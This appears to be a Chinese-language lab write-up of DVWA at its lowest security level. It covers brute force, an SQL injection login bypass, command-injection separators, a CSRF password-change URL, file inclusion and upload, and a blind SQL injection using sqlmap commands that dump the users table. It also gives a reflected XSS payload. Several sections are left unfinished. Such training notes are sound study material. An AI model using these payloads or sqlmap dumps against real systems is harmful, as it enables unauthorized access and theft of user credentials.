---
icon: pen-to-square
date: 2025-03-14
tags: 
title: DVWA
category:
  - 项目
---
# 前言
docker共享文件夹
```bash

```
# low
## brute Force
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314193624.png)
这题可以字典攻击
用集群炸弹攻击，会遍历所有排列
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314193938.png)
如果用pitchfork攻击，是这样的排列，按照字典的排列
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314194133.png)
简单列表就很奇怪了，只会插入一个payload位置
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314194626.png)
碰撞攻击会为每一个payload使用同一个字典
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314194822.png)


然后构造字典，实际情况会更复杂，花费的时间也更多
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314194045.png)

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314194441.png)
成功的组合长度是不同的
还有sql注入的方面也可以攻破此关
```sql
$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
```
源码的sql逻辑很简单，我们只需要
构建这样的payload即可通过
`user;` admin' or '1='1

## Command Injection
& ：前面一个命令无论是否执行，后面的命令都能执行，两个命令都执行  
- 似乎会同时执行两个命令
&&：前面一个命令执行成功后，才能执行后面一个命令，两个命令都执行  
- 等待前一个命令执行后才会执行下一个命令
|：前面一个命令无论是否执行，后面的命令都能执行且    **只执行后面一个**  

||：前面一个命令不能正常执行后，才能执行后面一个命令

；:跟&&的原理差不多
看看源码
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314200721.png)
可以发现会将"ping"直接拼接到我们的"地址"上
我们可以利用这个进行上面的命令拼接符进行攻击，执行危险操作

=======

## CSRF（跨站请求伪造）
```php
$pass = $_GET[ 'password' ];
```

这是一切问题的根源，这段代码说明了包含修改密码的请求包可以在url中集成，意味着攻击者可以通过这个url构建一个按钮，访问这个页面，在不知不觉中造成密码更改
```url
http://192.168.254.128/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change#
```

## File Inclusion
文件包含漏洞，可移植性任意文件，包括服务器本地文件和远程文件
```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?>


```

file upload
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250314204935.png)
没有对文件做过滤并且会返回文件路径

=======


## # Vulnerability: Insecure CAPTCHA

=======
## SQL Injection (Blind)
^use-sqlmap
先测试正常回显,输入1
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315111850.png)
然后输入-1
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315112001.png)
这里的逻辑
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315112027.png)
返回值不为0(不为false)时才会回显exists
那么很好办了，常规的布尔盲注
测试闭合,1'显示miss，1“显示exists，意味着闭合为'
用length(database())试数据库大小，到4时为正确 ^d5e614
```
1' and length(database())=4 #
```
然后使用sqlmap，注意cookie是这个
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315120605.png)
示例命令
```bash
sqlmap -u "http://192.168.254.128/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=vu5afsp2gm4hnrcib72jbhf2v1; security=low" --current-db
```
注意--cookie的值需要双引号框住[[sql注入#^sqlmap|sqlmap教程]]
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315122048.png)
成功爆库名
继续爆库名
```bash
sqlmap -u "http://192.168.254.128/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=vu5afsp2gm4hnrcib72jbhf2v1; security=low" -D dvwa --tables
```
- `-D`: 指定库名
- 爆表名
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315122434.png)
比刚才快很多
```bash
sqlmap -u "http://192.168.254.128/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=vu5afsp2gm4hnrcib72jbhf2v1; security=low" -D dvwa -T users --dump --batch
```
- --batch:不再询问确认
- --dump：爆数据
- -D dvwa -T users：指定已知数据
还是比较快的
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315123803.png)
成功
## XSS(Reflected)
XSS漏洞的本质在于弹到网页的用户输入的内容，如果没有过滤用javascript闭合就会造成脚本执行，会造成用户信息泄露等危害
验证是否有XSS的实例
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315124529.png)

```html
<script>alert('hack')</script>
```
回显，验证有XSS注入漏洞
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315124722.png)
网页代码中的位置
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250315125731.png)


======
## XSS(Stored)
